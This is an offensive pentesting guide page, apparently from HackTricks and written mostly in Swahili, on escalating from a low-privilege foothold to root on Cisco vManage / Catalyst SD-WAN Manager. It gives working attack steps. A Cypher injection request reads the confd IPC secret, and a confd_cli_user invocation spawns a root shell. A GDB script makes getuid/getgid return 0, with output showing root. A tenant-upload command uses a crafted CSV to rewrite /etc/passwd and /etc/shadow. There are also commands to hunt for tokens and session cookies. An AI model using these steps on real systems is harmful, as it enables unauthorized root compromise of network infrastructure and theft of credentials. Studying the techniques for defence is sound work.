# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Baada ya kupata code execution kwenye Cisco vManage / *Catalyst SD-WAN Manager* kama `vmanage`, `netadmin`, au `vmanage-admin`, maeneo muhimu zaidi ya local privesc kwa kawaida ni stack ya `confd` CLI, helper ya `cmdptywrapper`, localhost REST APIs, na handlers za import/upload zinazomilikiwa na root.

Ikiwa bado unahitaji **initial foothold** kwenye controller, angalia kwanza ukurasa maalum wa control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Ukaguzi wa haraka wa ndani
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ikiwa `/etc/confd/confd_ipc_secret` inaweza kusomeka kutoka kwenye foothold yako, Path 1 na Path 2 huwa zinaweza kutekelezwa mara moja. Ikiwa uliingia kupitia remote info leak au webshell, pia angalia kama tayari unaweza kufikia material ya SSH ya `vmanage-admin` au multitenancy upload handlers: utafiti wa 2026 ulionyesha kuwa yote mawili yalikuwa stepping stones halisi.

## Path 1

(Mfano kutoka [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Baada ya kuchunguza kidogo baadhi ya [documentation](http://66.218.245.39/doc/html/rn03re18.html) inayohusiana na `confd` na binaries mbalimbali (zinazopatikana ukiwa na akaunti kwenye tovuti ya Cisco), tuligundua kuwa ili kuthibitisha utambulisho wa IPC socket, hutumia secret iliyoko kwenye `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Kumbuka Neo4j instance yetu? Inaendesha kwa kutumia ruhusa za mtumiaji `vmanage`, hivyo inaturuhusu kupata faili hiyo kwa kutumia vulnerability ya awali:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Programu ya `confd_cli` haitumii arguments za command line, bali huita `/usr/bin/confd_cli_user` ikiwa na arguments. Kwa hiyo, tunaweza kuita moja kwa moja `/usr/bin/confd_cli_user` tukiwa na seti yetu wenyewe ya arguments. Hata hivyo, haiwezi kusomeka kwa privileges tulizo nazo sasa, hivyo tunapaswa kuipata kutoka kwenye rootfs na kuinakili kwa kutumia scp, kusoma help, kisha kuitumia kupata shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Njia ya 2

(Mfano kutoka [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Blogu¹ ya timu ya synacktiv ilieleza njia maridadi ya kupata root shell, lakini tatizo ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user`, ambayo inaweza kusomeka na root pekee. Nilipata njia nyingine ya kujipandisha hadi root bila usumbufu huo.

Nilipo-disassemble binary ya `/usr/bin/confd_cli`, niliona yafuatayo:

<details>
<summary>Objdump inayoonyesha ukusanyaji wa UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Nilipoendesha “ps aux”, niliona yafuatayo (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Nilidhania kuwa programu ya “confd_cli” hupitisha user ID na group ID iliyokusanywa kutoka kwa mtumiaji aliyeingia kwenye application ya “cmdptywrapper”.

Jaribio langu la kwanza lilikuwa kuendesha “cmdptywrapper” moja kwa moja na kuipatia `-g 0 -u 0`, lakini lilishindikana. Inaonekana file descriptor (-i 1015) iliundwa mahali fulani katika mchakato huo, na siwezi kuighushi.

Kama ilivyotajwa kwenye blog ya synacktiv (mfano wa mwisho), programu ya `confd_cli` haitumii command line argument, lakini ninaweza kuiathiri kwa kutumia debugger, na kwa bahati nzuri GDB imejumuishwa kwenye mfumo.

Niliunda GDB script ambapo nililazimisha API `getuid` na `getgid` zirudishe 0. Kwa kuwa tayari nina “vmanage” privilege kupitia deserialization RCE, nina ruhusa ya kusoma `/etc/confd/confd_ipc_secret` moja kwa moja.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Matokeo ya Console:

<details>
<summary>Matokeo ya Console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco baadaye iliandika kuhusu njia safi zaidi ya kupata root ndani ya advisory yake ya [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **mshambulizi aliyethibitishwa mwenye marupurupu ya kusoma tu** angeweza kutuma request iliyotengenezwa mahsusi kwa manager CLI na kupata root kwa sababu ya input validation isiyotosheleza.

Kwa mtazamo wa kushambulia, hili ndilo jambo muhimu la kuzingatia:

1. Mara tu unapokuwa na *low-priv foothold* yoyote kwenye kifaa, unapaswa kujaribu local CLI service kabla ya kuanza workflow nzito zaidi ya Path 1 / Path 2.
2. Tumia tena artifacts kutoka Path 2 ili kupata trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Chukulia kila field inayopitishwa kwa CLI backend kuwa ya kutiliwa shaka: UID/GID, username, terminal metadata, files zilizoingizwa, au value yoyote itakayotumiwa baadaye na root-owned helper.
4. Ikiwa low-priv user anaweza kufikia local CLI socket na kuathiri fields hizo, root inaweza kuwa request moja tu iliyotengenezwa mahsusi.

Workflow ya kutumia baada ya kuingia kwenye appliance ni:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Hii inabadilisha bug ya 2025 kuwa hunting pattern nzuri ya kutafuta versions zinazofanana: tafuta **local CLI shims zinazokusanya utambulisho katika userland na kuusambaza kwa wrapper yenye privileges zaidi**.

Usichanganye **CVE-2025-20122** na **CVE-2026-20122** iliyotokea baadaye: tatizo la 2025 ni bug ya *local* CLI-to-root, ilhali tatizo la 2026 ni remote API arbitrary file overwrite ambayo ni muhimu zaidi kwa kupanda foothold, kisha kurudia Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Advisory ya Cisco ya Februari 2026 pia ilianzisha privesc class nyingine muhimu: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) ilimruhusu **attacker wa local aliyethibitishwa, mwenye privileges za chini** kupata root kutokana na authentication mechanism isiyotosha katika REST API.

Hili ni muhimu kwa sababu vManage privesc haiishii tena kwenye abuse ya `confd`/TTY. Baada ya kupata low-priv shell, pia tafuta:

- localhost-only API endpoints zinazoamini caller kupita kiasi
- tokens, cookies, au service credentials zinazoweza kusomeka na account ya sasa
- vitendo vya root-only vilivyo exposed kupitia `dataservice`/REST handlers ambavyo bado vinaweza ku-triggeriwa locally

Kwa vitendo, ukishapata shell kama `vmanage` au service user mwingine, local API abuse mara nyingi huwa tulivu zaidi na rahisi ku-automate kuliko interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ikiwa local session context inatosha kufikia privileged REST functionality, pendelea API path: ni rahisi zaidi kuireplay, kuiscript, na kuiunganisha na web sessions au API tokens zilizoibiwa.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Pattern nyingine ya hivi karibuni ni [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): local attacker mwenye privileges za `netadmin` angeweza ku-upload **crafted file** ambayo CLI ingeishughulikia bila usalama baadaye, na kusababisha command injection kama `root`.

Kwa mtazamo wa HackTricks, technique yenye thamani ni pana zaidi kuliko CVE hiyo mahususi:

1. Enumerate kila CLI au web workflow inayokubali file: imports, diagnostic bundles, templates, validators, backups, tenant data, n.k.
2. Fuatilia uploaded file inaishia wapi na ni script au binary gani inayomilikiwa na root inayoitumia.
3. Test kama filename, file content, au parsed metadata hupitishwa wakati wowote kwa shell commands, wrapper scripts, au `system()`-style helpers.
4. Ikiwa tayari unaweza kufikia `netadmin` (valid creds, stolen session, au auth-bypass chain), file-processing bugs mara nyingi huwa njia ya haraka zaidi ya kufikia root.

Google Cloud / Mandiant baadaye walionyesha mfano halisi wa bug class hii ikitumiwa kupitia multitenancy import path:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Katika shambulio lililozingatiwa, CSV iliyoundwa kwa makusudi iliishia kurekebisha `/etc/passwd` na `/etc/shadow` na kuunda akaunti ya muda yenye UID 0 (`troot`). Hilo linafanya waingizaji wa aina ya `tenant-upload` / `tenant-list` kuwa wa kuvutia zaidi: si vipengele vya kuingiza data tu, bali pia front-end za parser zinazoweza kumilikiwa na root.

Mfumo wa haraka wa utafutaji upande wa shell ni:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Aina hii ya bug huungana vizuri sana hasa na remote footholds zinazokupa `netadmin` lakini si `root`.

## Vulns nyingine za hivi karibuni za vManage/Catalyst SD-WAN Manager za ku-chain

- **Unauthenticated info leak (CVE-2026-20133)** – Ina thamani kubwa hasa kwa sababu utafiti wa umma ulionyesha kuwa inaweza kufichua `confd_ipc_secret` au private key ya `vmanage-admin`, hivyo kubadilisha read bug kuwa Path 1 au NETCONF pivot.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Ni tofauti na CLI bug ya 2025 iliyo hapo juu; VulnCheck iliitumia kupakia webshell, ambayo hufanya local privesc paths kwenye ukurasa huu kuwa muhimu mara moja.
- **Authenticated UI XSS (CVE-2024-20475)** – Steal admin session kwenye web UI, kisha pivot kwenda kwenye API/CLI actions ambazo hatimaye zinafikia `vshell` au mojawapo ya local privesc paths zilizo hapo juu.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Ni precursor yenye nguvu sana kwa Path 5 kwa sababu `netadmin` ndiyo level inayohitajika na 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Ina offensive value inayofanana na CVE-2026-20122 lakini kupitia web UI upload path ya baadaye: andika kwenye location ambayo baadaye itaparsiwa na root au management-plane web tier.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intrusions za 2026 zilionyesha kuwa attackers wanaweza kurudisha mfumo kwenye SD-WAN build ya zamani iliyo vulnerable, kutumia old CLI root bug, kisha kurejesha version ya awali.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Imeelezwa vizuri zaidi kwenye dedicated SD-WAN control-plane page; inaweza kuappend SSH key kwa `vmanage-admin`, na kukupa local foothold inayohitajika ili kurudia ukurasa huu.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
